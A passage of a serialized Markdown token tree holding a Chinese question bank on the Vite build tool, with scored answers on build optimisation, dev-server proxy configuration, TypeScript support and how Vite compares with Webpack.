个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 代码压缩与混淆:<br>\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。<br>\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","task":false,"loose":false,"text":"**1：** 代码压缩与混淆:<br>\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。<br>\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","tokens":[{"type":"text","raw":"**1：** 代码压缩与混淆:<br>\\n\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。<br>\\n\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","text":"**1：** 代码压缩与混淆:<br>\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。<br>\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码压缩与混淆:","text":" 代码压缩与混淆:","escaped":false},{"type":"html","raw":"<br>","inLink":false,"inRawBlock":false,"block":false,"text":"<br>"},{"type":"text","raw":"\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。","text":"\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。","escaped":false},{"type":"html","raw":"<br>","inLink":false,"inRawBlock":false,"block":false,"text":"<br>"},{"type":"text","raw":"\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","text":"\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction add(a, b) {\\n    return a + b;\\n}\\n```","lang":"js","text":"function add(a, b) {\\n    return a + b;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"经过压缩和混淆后可能变成类似function n(a,b){return a + b;}的形式，文件大小也会显著减小。","text":"经过压缩和混淆后可能变成类似function n(a,b){return a + b;}的形式，文件大小也会显著减小。","tokens":[{"type":"text","raw":"经过压缩和混淆后可能变成类似function n(a,b){return a + b;}的形式，文件大小也会显著减小。","text":"经过压缩和混淆后可能变成类似function n(a,b){return a + b;}的形式，文件大小也会显著减小。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** CSS 优化:</br>\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。</br>\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。\\n\\n- **1：** 静态资源处理:</br>\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。</br>\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。\\n\\n- **2：** Tree - Shaking（摇树优化）:</br>\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。</br>\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** CSS 优化:</br>\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。</br>\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。\\n\\n","task":false,"loose":true,"text":"**1：** CSS 优化:</br>\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。</br>\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。\\n","tokens":[{"type":"text","raw":"**1：** CSS 优化:</br>\\n\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。</br>\\n\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。\\n","text":"**1：** CSS 优化:</br>\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。</br>\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" CSS 优化:","text":" CSS 优化:","escaped":false},{"type":"html","raw":"</br>","inLink":false,"inRawBlock":false,"block":false,"text":"</br>"},{"type":"text","raw":"\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。","text":"\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。","escaped":false},{"type":"html","raw":"</br>","inLink":false,"inRawBlock":false,"block":false,"text":"</br>"},{"type":"text","raw":"\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。","text":"\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 静态资源处理:</br>\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。</br>\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。\\n\\n","task":false,"loose":true,"text":"**1：** 静态资源处理:</br>\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。</br>\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。\\n","tokens":[{"type":"text","raw":"**1：** 静态资源处理:</br>\\n\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。</br>\\n\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。\\n","text":"**1：** 静态资源处理:</br>\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。</br>\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 静态资源处理:","text":" 静态资源处理:","escaped":false},{"type":"html","raw":"</br>","inLink":false,"inRawBlock":false,"block":false,"text":"</br>"},{"type":"text","raw":"\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。","text":"\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。","escaped":false},{"type":"html","raw":"</br>","inLink":false,"inRawBlock":false,"block":false,"text":"</br>"},{"type":"text","raw":"\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。","text":"\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** Tree - Shaking（摇树优化）:</br>\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。</br>\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","task":false,"loose":true,"text":"**2：** Tree - Shaking（摇树优化）:</br>\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。</br>\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","tokens":[{"type":"text","raw":"**2：** Tree - Shaking（摇树优化）:</br>\\n\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。</br>\\n\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","text":"**2：** Tree - Shaking（摇树优化）:</br>\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。</br>\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Tree - Shaking（摇树优化）:","text":" Tree - Shaking（摇树优化）:","escaped":false},{"type":"html","raw":"</br>","inLink":false,"inRawBlock":false,"block":false,"text":"</br>"},{"type":"text","raw":"\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。","text":"\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。","escaped":false},{"type":"html","raw":"</br>","inLink":false,"inRawBlock":false,"block":false,"text":"</br>"},{"type":"text","raw":"\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","text":"\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 在 Vite 项目中如何配置代理（Proxy）以解决跨域问题？\\n\\n","depth":2,"text":"在 Vite 项目中如何配置代理（Proxy）以解决跨域问题？","tokens":[{"type":"text","raw":"在 Vite 项目中如何配置代理（Proxy）以解决跨域问题？","text":"在 Vite 项目中如何配置代理（Proxy）以解决跨域问题？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 在 vite.config.js 中配置 server.proxy 选项，例如：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 在 vite.config.js 中配置 server.proxy 选项，例如：","task":false,"loose":false,"text":"**1：** 在 vite.config.js 中配置 server.proxy 选项，例如：","tokens":[{"type":"text","raw":"**1：** 在 vite.config.js 中配置 server.proxy 选项，例如：","text":"**1：** 在 vite.config.js 中配置 server.proxy 选项，例如：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在 vite.config.js 中配置 server.proxy 选项，例如：","text":" 在 vite.config.js 中配置 server.proxy 选项，例如：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nmodule.exports = {\\n  server: {\\n    proxy: {\\n      \'/api\': {\\n        target: \'http://backend-api-url\',\\n        changeOrigin: true,\\n        rewrite: (path) => path.replace(/^\\\\/api/, \'\')\\n      }\\n    }\\n  }\\n};\\n// 这会将所有以 /api 开头的请求代理到指定的后端 API 地址，并根据 rewrite 规则修改请求路径。\\n```","lang":"js","text":"module.exports = {\\n  server: {\\n    proxy: {\\n      \'/api\': {\\n        target: \'http://backend-api-url\',\\n        changeOrigin: true,\\n        rewrite: (path) => path.replace(/^\\\\/api/, \'\')\\n      }\\n    }\\n  }\\n};\\n// 这会将所有以 /api 开头的请求代理到指定的后端 API 地址，并根据 rewrite 规则修改请求路径。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Vite 在开发模式下如何实现快速启动？\\n\\n","depth":2,"text":"Vite 在开发模式下如何实现快速启动？","tokens":[{"type":"text","raw":"Vite 在开发模式下如何实现快速启动？","text":"Vite 在开发模式下如何实现快速启动？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","task":false,"loose":false,"text":"**2：** Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","tokens":[{"type":"text","raw":"**2：** Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","text":"**2：** Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","text":" Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Vite 如何支持 TypeScript？\\n\\n","depth":2,"text":"Vite 如何支持 TypeScript？","tokens":[{"type":"text","raw":"Vite 如何支持 TypeScript？","text":"Vite 如何支持 TypeScript？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","task":false,"loose":false,"text":"**2：** Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","tokens":[{"type":"text","raw":"**2：** Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","text":"**2：** Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","text":" Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Vite 与传统的 Webpack 打包工具有何不同？\\n\\n","depth":2,"text":"Vite 与传统的 Webpack 打包工具有何不同？","tokens":[{"type":"text","raw":"Vite 与传统的 Webpack 打包工具有何不同？","text":"Vite 与传统的 Webpack 打包工具有何不同？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","task":false,"loose":false,"text":"**2：** Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","tokens":[{"type":"text","raw":"**2：** Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","text":"**2：** Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","text":" Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Vite 项目构建速度快的原因是什么？\\n\\n","depth":2,"text":"Vite 项目构建速度快的原因是什么？","tokens":[{"type":"text","raw":"Vite 项目构建速度快的原因是什么？","text":"Vite 项目构建速度快的原因是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","task":false,"loose":false,"text":"**1：** Vite 